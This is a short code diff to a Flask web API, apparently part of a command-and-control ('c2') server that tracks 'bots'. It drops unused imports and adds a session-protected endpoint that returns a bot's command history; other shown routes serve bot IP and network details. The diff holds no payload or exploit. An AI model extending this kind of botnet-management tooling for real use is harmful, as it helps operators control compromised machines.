@@ -1,19 +1,9 @@
-import os
-import time
-import datetime
-import uuid
-import json
-
 from flask import request
-import flask
-from werkzeug.utils import secure_filename
 from flask import session
-
 
 from c2.app import app
 from c2.app import get_db
 from c2.database import get_bot_record as dbget
-from c2.database import update_bot_record as db
 
 
 @app.route('/api/v1/ip', methods=['GET'])
@@ -77,3 +67,12 @@ def get_network_list(uuid):
     conn = get_db()
     network_info = dbget.network_info_to_dict(conn, uuid)
     return network_info
+
+
+@app.route('/api/v1/commandhistory/<uuid>', methods=['GET'])
+def get_command_history(uuid):
+    if 'username' not in session:
+        return "Unauthorized", 401
+    conn = get_db()
+    command_history = dbget.command_history_to_dict(conn, uuid)
+    return command_history
